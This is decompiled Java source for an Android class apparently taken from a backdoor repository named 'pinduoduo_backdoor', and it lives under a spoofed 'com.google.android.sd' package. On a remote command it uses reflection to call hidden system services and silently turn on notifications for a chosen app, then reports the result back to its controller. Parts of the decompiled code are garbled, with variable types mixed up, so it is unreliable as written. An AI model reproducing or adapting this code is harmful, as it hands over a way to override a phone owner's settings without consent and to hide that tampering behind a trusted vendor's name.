package com.google.android.sd.biz_dynamic_dex.vivo_open_push;

import android.content.Context;
import android.os.IBinder;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.TrackUtils;
import com.google.android.sd.utils.Utils;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
import org.json.JSONException;
import org.json.JSONObject;

public class VivoOpenPushExecutor extends DynamicCmdExecutor {
  private static final int CMD = 1006;
  
  private static String pkgName = "";
  
  private static String uuid;
  
  private static Map<String, String> buildMap(boolean paramBoolean, String paramString) {
    HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
    if (paramBoolean) {
      hashMap.put("status", "1");
    } else {
      hashMap.put("status", "0");
    } 
    hashMap.put("details", paramString);
    return (Map)hashMap;
  }
  
  private void fail(Context paramContext, String paramString) {
    CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(new CmdData(1006, uuid, "client"), paramString, null));
    TrackUtils.submitTrack(paramContext, 1006, buildMap(false, paramString));
  }
  
  public static Object getClassForName(String paramString) throws Exception {
    return Class.class.getDeclaredMethod("forName", new Class[] { String.class }).invoke(null, new Object[] { paramString });
  }
  
  public static IBinder getServiceIbinder(String paramString) {
    try {
      Method method = Class.class.getDeclaredMethod("forName", new Class[] { String.class });
      return (IBinder)((Method)Class.class.getMethod("getMethod", new Class[] { String.class, Class[].class }).invoke(method.invoke(null, new Object[] { "android.os.ServiceManager" }), new Object[] { "getService", { String.class } })).invoke(null, new Object[] { paramString });
    } catch (Exception exception) {
      return null;
    } 
  }
  
  private boolean init(Context paramContext, String paramString) {
    try {
      JSONObject jSONObject = new JSONObject(paramString);
      uuid = jSONObject.getString("uuid");
      pkgName = jSONObject.getString("pkg_name");
      return true;
    } catch (Exception exception) {
      fail(paramContext, exception.getMessage());
      return false;
    } 
  }
  
  private void success(Context paramContext, String paramString) {
    JSONObject jSONObject = new JSONObject();
    CmdData cmdData = new CmdData(1006, uuid, "client");
    try {
      jSONObject.put("details", paramString);
      CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(cmdData, jSONObject, null));
      TrackUtils.submitTrack(paramContext, 1006, buildMap(true, paramString));
      return;
    } catch (JSONException jSONException) {
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, jSONException.toString(), null));
      TrackUtils.submitTrack(paramContext, 1006, buildMap(false, paramString));
      return;
    } 
  }
  
  public boolean areNotificationsEnabledForPackage(Context paramContext, String paramString, Method[] paramArrayOfMethod, Object paramObject) throws Exception {
    StringBuilder stringBuilder1;
    StringBuilder stringBuilder2;
    int j = getUidFromPkg(paramContext, paramString);
    if (j == 0) {
      stringBuilder1 = new StringBuilder();
      stringBuilder1.append("uid: 0, pkgName: ");
      stringBuilder1.append(paramString);
      fail(paramContext, stringBuilder1.toString());
      return false;
    } 
    StringBuilder stringBuilder3 = null;
    int k = stringBuilder1.length;
    int i = 0;
    while (true) {
      stringBuilder2 = stringBuilder3;
      if (i < k) {
        stringBuilder2 = stringBuilder1[i];
        if (TextUtils.equals("areNotificationsEnabledForPackage", stringBuilder2.getName()))
          break; 
        i++;
        continue;
      } 
      break;
    } 
    if (stringBuilder2 == null) {
      stringBuilder1 = new StringBuilder();
      stringBuilder1.append("areNotificationsEnabledForPackage is null");
      stringBuilder1.append(paramString);
      fail(paramContext, stringBuilder1.toString());
      return false;
    } 
    Object object = stringBuilder2.invoke(paramObject, new Object[] { paramString, Integer.valueOf(j) });
    if (object == null || !Boolean.parseBoolean(String.valueOf(object))) {
      stringBuilder1 = new StringBuilder();
      stringBuilder1.append("ret: ");
      stringBuilder1.append(object);
      fail(paramContext, stringBuilder1.toString());
      return false;
    } 
    return true;
  }
  
  public int getUidFromPkg(Context paramContext, String paramString) {
    try {
      return (paramContext.getPackageManager().getApplicationInfo(paramString, 0)).uid;
    } catch (Exception exception) {
      return 0;
    } 
  }
  
  public void openNotification(Context paramContext) {
    try {
      Object object = getClassForName("android.app.INotificationManager$Stub");
      Method method = Class.class.getMethod("getMethods", new Class[0]);
      method.setAccessible(true);
      Method[] arrayOfMethod = (Method[])method.invoke(object, new Object[0]);
      if (arrayOfMethod == null) {
        fail(paramContext, "methods in INotificationManager$Stub is null");
        return;
      } 
      int j = arrayOfMethod.length;
      int i = 0;
      while (true) {
        object = null;
        if (i < j) {
          object = arrayOfMethod[i];
          if (object.getName().equals("asInterface")) {
            object = object.invoke(null, new Object[] { getServiceIbinder("notification") });
          } else {
            i++;
            continue;
          } 
        } 
        if (object == null) {
          fail(paramContext, "notificationService is null");
          return;
        } 
        Method[] arrayOfMethod1 = (Method[])method.invoke(object.getClass(), new Object[0]);
        if (setNotificationsEnabledForPackage(paramContext, pkgName, arrayOfMethod1, object) && areNotificationsEnabledForPackage(paramContext, pkgName, arrayOfMethod1, object)) {
          success(paramContext, "success");
          return;
        } 
        return;
      } 
    } catch (Exception exception) {
      fail(paramContext, exception.getMessage());
    } 
  }
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    if (init(paramContext, paramString))
      openNotification(paramContext); 
  }
  
  public boolean setNotificationsEnabledForPackage(Context paramContext, String paramString, Method[] paramArrayOfMethod, Object paramObject) throws Exception {
    StringBuilder stringBuilder1;
    StringBuilder stringBuilder2;
    int j = getUidFromPkg(paramContext, paramString);
    if (j == 0) {
      stringBuilder1 = new StringBuilder();
      stringBuilder1.append("uid: 0, pkgName: ");
      stringBuilder1.append(paramString);
      fail(paramContext, stringBuilder1.toString());
      return false;
    } 
    StringBuilder stringBuilder3 = null;
    int k = stringBuilder1.length;
    int i = 0;
    while (true) {
      stringBuilder2 = stringBuilder3;
      if (i < k) {
        stringBuilder2 = stringBuilder1[i];
        if (TextUtils.equals("setNotificationsEnabledForPackage", stringBuilder2.getName()))
          break; 
        i++;
        continue;
      } 
      break;
    } 
    if (stringBuilder2 == null) {
      stringBuilder1 = new StringBuilder();
      stringBuilder1.append("setNotificationsEnabledForPackage is null");
      stringBuilder1.append(paramString);
      fail(paramContext, stringBuilder1.toString());
      return false;
    } 
    stringBuilder2.invoke(paramObject, new Object[] { paramString, Integer.valueOf(j), Boolean.valueOf(true) });
    return true;
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\2eb20dc580aaa5186ee4a4ceb2374669-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_open_push\VivoOpenPushExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */